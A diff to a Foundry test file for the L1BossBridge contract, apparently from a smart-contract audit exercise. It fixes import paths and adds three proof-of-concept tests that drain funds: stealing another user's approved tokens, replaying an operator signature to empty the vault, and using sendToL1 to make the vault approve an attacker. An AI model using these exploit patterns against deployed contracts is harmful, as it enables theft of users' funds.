@@ -2,12 +2,12 @@
 pragma solidity 0.8.20;
 
 import { Test, console2 } from "forge-std/Test.sol";
-import { ECDSA } from "openzeppelin/contracts/utils/cryptography/ECDSA.sol";
-import { MessageHashUtils } from "openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
-import { Ownable } from "openzeppelin/contracts/access/Ownable.sol";
+import { ECDSA } from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
+import { MessageHashUtils } from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
+import { Ownable } from "@openzeppelin/contracts/access/Ownable.sol";
 import { Pausable } from "@openzeppelin/contracts/utils/Pausable.sol";
 import { L1BossBridge, L1Vault } from "../src/L1BossBridge.sol";
-import { IERC20 } from "openzeppelin/contracts/interfaces/IERC20.sol";
+import { IERC20 } from "@openzeppelin/contracts/interfaces/IERC20.sol";
 import { L1Token } from "../src/L1Token.sol";
 
 contract L1BossBridgeTest is Test {
@@ -223,4 +223,68 @@ contract L1BossBridgeTest is Test {
     {
         return vm.sign(privateKey, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
     }
+
+    function testCanMoveApprovedTokensFromOtherUser() public{
+        vm.prank(user);
+        token.approve(address(tokenBridge), type(uint256).max);
+
+        address attacker = makeAddr("attacker");
+        address attackerInL2 = makeAddr("attackerInL2");
+        vm.startPrank(attacker);
+        uint256 amount = token.balanceOf(user);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(user, attackerInL2, amount);
+        tokenBridge.depositTokensToL2(user, attackerInL2, amount);
+        vm.stopPrank();
+
+        assert(token.balanceOf(address(vault)) == amount);
+        assert(token.balanceOf(user) == 0);
+    }
+
+    function testSignatureReplay() public {
+        address attacker = makeAddr("attacker");
+        address attackerInL2 = makeAddr("attackerInL2");
+
+        uint256 attackerInitBalance = 1e18;
+        uint256 vaultInitBalance = 10e18;
+        deal(address(token), attacker, attackerInitBalance);
+        deal(address(token), address(vault), vaultInitBalance);
+
+        vm.startPrank(attacker);
+        token.approve(address(tokenBridge), type(uint256).max);
+        tokenBridge.depositTokensToL2(attacker, attackerInL2, attackerInitBalance);
+
+        (uint8 v, bytes32 r, bytes32 s) =
+            _signMessage(_getTokenWithdrawalMessage(attacker, attackerInitBalance), operator.key);
+        
+        while(token.balanceOf(address(vault)) > 0) {
+            tokenBridge.withdrawTokensToL1(attacker, attackerInitBalance, v, r, s);
+        }
+
+        assert(token.balanceOf(address(vault)) == 0);
+        assert(token.balanceOf(attacker) == vaultInitBalance + attackerInitBalance);
+    }
+
+    function testCanCallVaultApproveFromBridgeAndDrainVault() public {
+        address attacker = makeAddr("attacker");
+        uint256 vaultInitialBalance = 1000e18;
+        deal(address(token), address(vault), vaultInitialBalance);
+
+        vm.startPrank(attacker);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(attacker), address(0), 0);
+        tokenBridge.depositTokensToL2(attacker, address(0), 0);
+
+        bytes memory message = abi.encode(
+            address(vault), 
+            0, 
+            abi.encodeCall(L1Vault.approveTo, (address(attacker), type(uint256).max))
+        );
+        (uint8 v, bytes32 r, bytes32 s) = _signMessage(message, operator.key);
+
+        tokenBridge.sendToL1(v, r, s, message);
+        assertEq(token.allowance(address(vault), attacker), type(uint256).max);
+        token.transferFrom(address(vault), attacker, token.balanceOf(address(vault)));
+    }
+
 }
